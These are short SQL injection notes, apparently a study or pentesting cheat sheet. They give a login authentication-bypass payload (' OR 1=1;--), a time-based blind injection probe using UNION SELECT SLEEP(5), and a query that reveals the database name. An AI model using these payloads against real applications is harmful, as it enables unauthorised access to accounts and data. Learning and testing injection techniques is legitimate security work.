```sql
for: select * from users where username='%username%' and password='%password%' LIMIT 1;
use: ' OR 1=1;--
```

```sql
UNION SELECT SLEEP(5)
;-- Your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.
```

```sql
SELECT DATABASE();
;-- returns the name of the current (default) database
```
